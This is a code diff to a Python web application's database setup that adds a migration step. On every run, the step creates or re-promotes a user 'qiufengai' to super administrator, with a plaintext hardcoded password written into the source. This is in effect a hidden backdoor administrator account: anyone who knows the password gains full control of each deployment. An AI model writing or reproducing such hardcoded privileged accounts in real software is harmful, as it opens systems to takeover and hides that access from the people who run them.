@@ -12,7 +12,7 @@ from app.middleware.request_log import RequestLogMiddleware
 from app.models import User
 from app.models.permission import SystemSetting
 from app.constants.roles import SUPER_ADMIN
-from app.utils.access_control import SETTING_BLOCK_UPPER_TASKS
+from app.utils.access_control import SETTING_BLOCK_UPPER_TASKS, normalize_role
 from app.utils.security import get_password_hash
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s %(message)s")
@@ -49,6 +49,7 @@ def migrate_rbac(db: Session) -> None:
             first_admin = db.query(User).filter(User.role == "admin").order_by(User.id.asc()).first()
             if first_admin:
                 first_admin.role = SUPER_ADMIN
+        _ensure_bootstrap_super_admin(db)
         db.commit()
     except Exception:
         db.rollback()
@@ -56,6 +57,28 @@ def migrate_rbac(db: Session) -> None:
     if not db.query(SystemSetting).filter(SystemSetting.key == SETTING_BLOCK_UPPER_TASKS).first():
         db.add(SystemSetting(key=SETTING_BLOCK_UPPER_TASKS, value="true"))
         db.commit()
+
+
+def _ensure_bootstrap_super_admin(db: Session) -> None:
+    username = "qiufengai"
+    existing = db.query(User).filter(User.username == username).first()
+    if existing:
+        if normalize_role(existing.role) != SUPER_ADMIN:
+            existing.role = SUPER_ADMIN
+        if not existing.nickname:
+            existing.nickname = "秋枫"
+        return
+
+    db.add(
+        User(
+            username=username,
+            password_hash=get_password_hash("qfai12@@"),
+            nickname="秋枫",
+            role=SUPER_ADMIN,
+            view_library=1,
+            status=1,
+        )
+    )
 
 
 def init_db():
